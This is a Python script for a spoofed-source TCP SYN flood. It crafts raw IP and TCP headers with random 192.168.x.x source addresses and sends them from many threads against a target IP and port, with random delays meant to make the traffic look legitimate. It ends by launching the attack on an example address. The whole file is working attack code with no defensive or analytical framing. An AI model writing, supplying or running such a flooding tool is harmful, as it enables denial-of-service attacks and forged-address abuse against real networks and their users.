import socket
import random
import threading
import time
import struct

# Create a raw socket for IP spoofing
def create_raw_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        return s
    except socket.error as e:
        print(f"Socket could not be created. Error Code: {e}")
        return None

# Create a bad packet with spoofed IP
def create_bad_packet(src_ip, dst_ip, dst_port):
    # IP header fields
    ihl = 5  # Internet Header Length
    version = 4  # IPv4
    tos = 0  # Type of Service
    tot_len = 20 + 20  # Total length (IP + TCP headers)
    id = random.randint(1, 65535)  # Packet ID
    frag_off = 0  # Fragment offset
    ttl = 255  # Time to live
    protocol = socket.IPPROTO_TCP  # Protocol
    check = 0  # Checksum (will be filled by kernel)
    saddr = socket.inet_aton(src_ip)  # Source IP
    daddr = socket.inet_aton(dst_ip)  # Destination IP

    # IP header
    ip_header = struct.pack('!BBHHHBBH4s4s', (version << 4) + ihl, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

    # TCP header fields
    source = random.randint(1024, 65535)  # Source port
    seq = 0  # Sequence number
    ack_seq = 0  # Acknowledgment number
    doff = 5  # Data offset (TCP header size)
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840)  # Window size
    check = 0  # Checksum (will be filled by kernel)
    urg_ptr = 0  # Urgent pointer

    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

    tcp_header = struct.pack('!HHLLBBHHH', source, dst_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)

    # Calculate TCP checksum
    source_address = socket.inet_aton(src_ip)
    dest_address = socket.inet_aton(dst_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header

    tcp_checksum = checksum(psh)
    tcp_header = struct.pack('!HHLLBBH', source, dst_port, seq, ack_seq, offset_res, tcp_flags, window) + struct.pack('H', tcp_checksum) + struct.pack('!H', urg_ptr)

    # Final packet = IP header + TCP header
    packet = ip_header + tcp_header
    return packet

# Calculate checksum
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    return s

# Perform the attack with multi-threading and dynamic intervals
def slow_bad_packet_attack(target_ip, target_port, num_connections):
    sockets = []
    for i in range(num_connections):
        sock = create_raw_socket()
        if sock:
            sockets.append(sock)

    def send_bad_packet(sock, dst_ip, dst_port):
        while True:
            src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = create_bad_packet(src_ip, dst_ip, dst_port)
            try:
                sock.sendto(packet, (dst_ip, 0))
                time.sleep(random.uniform(0.5, 2.5))  # Random delay to mimic legit traffic
            except Exception as e:
                print(f"Error sending packet: {e}")
                break

    threads = []
    for sock in sockets:
        thread = threading.Thread(target=send_bad_packet, args=(sock, target_ip, target_port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Example usage
target_ip = "192.168.1.100"
target_port = 80
num_connections = 100

slow_bad_packet_attack(target_ip, target_port, num_connections)
